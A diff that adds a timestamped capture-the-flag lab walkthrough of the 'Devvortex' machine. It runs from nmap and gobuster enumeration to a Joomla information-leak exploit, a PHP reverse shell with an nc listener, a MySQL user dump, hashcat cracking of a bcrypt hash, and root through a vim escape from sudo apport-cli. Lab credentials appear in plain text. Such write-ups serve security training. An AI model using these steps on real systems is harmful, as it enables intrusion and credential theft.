@@ -1,0 +1,131 @@
+2024-04-24 Wed 06:07 PM `nmap -sC -sV -oA nmap/devvortex 10.10.11.242`
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-24 18:08 MDT
+Nmap scan report for 10.10.11.242
+Host is up (0.047s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://devvortex.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+2024-04-24 Wed 06:09 PM Adding to /etc/hosts
+
+2024-04-24 Wed 06:10 PM Site recon
+- input field for email at bottom
+- form to request a call back
+2024-04-24 Wed 06:14 PM Neither of these do any actions
+2024-04-24 Wed 06:14 PM Enumerating website paths: `gobuster dir -e -u
+http://devvortex.htb -w /usr/share/wordlists/dirb/common.txt`
+2024-04-24 Wed 06:17 PM gobuster yielded a /images path but it is a 403
+forbidden? Trying with the big.txt wordlist
+
+2024-04-24 Wed 06:31 PM Enumerating subdomains with gobuster dns -d devvortex.htb -w /usr/share/wordlists/subdomains-top1million-20000.txt
+2024-04-24 Wed 06:41 PM Reveals a dev. subdomain which has an index.php page.
+No visible inputs though.
+2024-04-24 Wed 06:43 PM gobuster dir -e -u http://dev.devvortex.htb -w
+/usr/share/wordlists/dirb/common.txt yields
+http://dev.devvortex.htb/.history             (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.cvsignore           (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.cache               (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.git/HEAD            (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.cvs                 (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.bash_history        (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.bashrc              (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.htaccess            (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.hta                 (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.config              (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.forward             (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.listing             (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.htpasswd            (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.listings            (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.rhosts              (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.profile             (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.sh_history          (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.ssh                 (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.passwd              (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.perf                (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.mysql_history       (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.swf                 (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.subversion          (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.web                 (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.svn                 (Status: 403) [Size: 162]
+http://dev.devvortex.htb/.svn/entries         (Status: 403) [Size: 162]
+http://dev.devvortex.htb/administrator        (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/administrator/]                                                                           
+http://dev.devvortex.htb/api                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/api/]                                                                                     
+http://dev.devvortex.htb/cache                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cache/]                                                                                   
+http://dev.devvortex.htb/components           (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/components/]                                                                              
+http://dev.devvortex.htb/home                 (Status: 200) [Size: 23221]
+http://dev.devvortex.htb/images               (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/images/]                                                                                  
+http://dev.devvortex.htb/includes             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/includes/]                                                                                
+http://dev.devvortex.htb/index.php            (Status: 200) [Size: 23221]
+http://dev.devvortex.htb/language             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/language/]                                                                                
+http://dev.devvortex.htb/layouts              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/layouts/]                                                                                 
+http://dev.devvortex.htb/libraries            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/libraries/]                                                                               
+http://dev.devvortex.htb/media                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/media/]                                                                                   
+http://dev.devvortex.htb/modules              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/modules/]                                                                                 
+http://dev.devvortex.htb/plugins              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/plugins/]                                                                                 
+http://dev.devvortex.htb/robots.txt           (Status: 200) [Size: 764]
+http://dev.devvortex.htb/templates            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/templates/]                                                                               
+http://dev.devvortex.htb/tmp                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/tmp/]   
+
+2024-04-24 Wed 06:46 PM Most notably, the /administrator and the fact that we
+have a mysql database
+
+2024-04-24 Wed 06:54 PM Site is running Joomla ... wat is it
+2024-04-24 Wed 07:09 PM It's a web... server? Thing? But by going to
+http://dev.devvortex.htb/administrator/manifests/files/joomla.xml we can see
+that it is running 4.2.6. Everything in Metasploit is too old. Checking Exploit
+database.
+2024-04-24 Wed 07:14 PM Payload found at
+https://www.exploit-db.com/exploits/51334 that will show us a bunch of user
+information
+2024-04-24 Wed 07:21 PM Saved to directory, ran `ruby payload.rb
+http://dev.devvortex.htb > users.txt`
+Result:
+- username: lewis
+- password: P4ntherg0t1n5r3c0n##
+
+2024-04-24 Wed 07:28 PM We get an admin dashboard with a banner right at the
+top: We have detected that your server is using PHP 7.4.3 which is obsolete and no longer receives official security updates by its developers. The Joomla! Project recommends upgrading your site to PHP 8.1 or later which will receive security updates at least until 2024-11-25. 
+2024-04-24 Wed 07:29 PM2024-04-24 Wed 07:29 PM2024-04-24 Wed 07:29 PM Checking
+for vulns for PHP 7.4.3. This is a Red Herring.
+2024-04-24 Wed 07:38 PM After exploring the dashboard, it appears we can simply
+edit the index.php file. 
+
+--- REVERSE SHELL ---
+2024-04-24 Wed 07:41 PM listener: ` nc -lvnp 1234`
+2024-04-24 Wed 07:41 PM PHP Payload: PHP PentestMonkey from revshells.com 
+
+2024-04-24 Wed 09:00 PM mysql -e "SHOW DATABASES;" --user=lewis
+--password=<pass>
+2024-04-24 Wed 09:01 PM mysql -e "USE joomla;SHOW TABLES;" --user=lewis
+--password=<pass>
+
+$ mysql -e "use joomla;select * from sd4fg_users" --user=lewis --password=P4ntherg0t1n5r3c0n##
+mysql: [Warning] Using a password on the command line interface can be insecure.
+id      name    username        email   password        block   sendEmail       registerDate   lastvisitDate    activation      params  lastResetTime   resetCount      otpKey  otep    requireReset    authProvider
+649     lewis   lewis   lewis@devvortex.htb     $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u    0       1       2023-09-25 16:44:24     2024-04-25 02:43:14     0              NULL     0                       0
+650     logan paul      logan   logan@devvortex.htb     $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12    0       0       2023-09-26 19:15:42     NULL            {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} NULL    0                       0
+
+Hash is : $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
+
+2024-04-24 Wed 09:08 PM Ran `hashcat -m 3200 -a 0 hash.txt
+/usr/share/wordlists/rockyou.txt` and password is `tequieromucho`
+2024-04-24 Wed 09:08 PM ssh logan@10.10.11.242 works with the password
+2024-04-24 Wed 09:12 PM user.txt cracked
+
+--- PRIVESC ---
+2024-04-24 Wed 09:12 PM `sudo -l` to see what we can run as root
+User logan may run the following commands on devvortex:
+    (ALL : ALL) /usr/bin/apport-cli
+
+2024-04-24 Wed 09:22 PM This generated a bug report creation which allowed for
+the option to view a report in vim.
+2024-04-24 Wed 09:23 PM You can execute code from vim by esc + ! + cmd, so
+!/bin/bash was achievable. Flag was in root/ 
